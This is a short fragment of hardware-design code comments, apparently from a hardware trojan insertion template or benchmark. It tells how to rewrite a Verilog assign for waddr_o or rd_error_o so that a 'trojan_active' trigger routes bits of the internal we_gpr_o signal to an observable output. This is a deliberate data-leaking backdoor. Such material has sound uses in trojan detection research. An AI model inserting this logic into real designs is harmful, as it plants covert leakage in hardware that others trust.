 ...
 * Payload: Route waddr_o[0] to observable output
 * 
...
//   Find the assign for waddr_o (or rd_error_o as fallback):
//     assign waddr_o = <normal_expr>;
//   Replace with:
//     assign waddr_o = trojan_active ? we_gpr_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? we_gpr_o[0] : 1'b0;
//
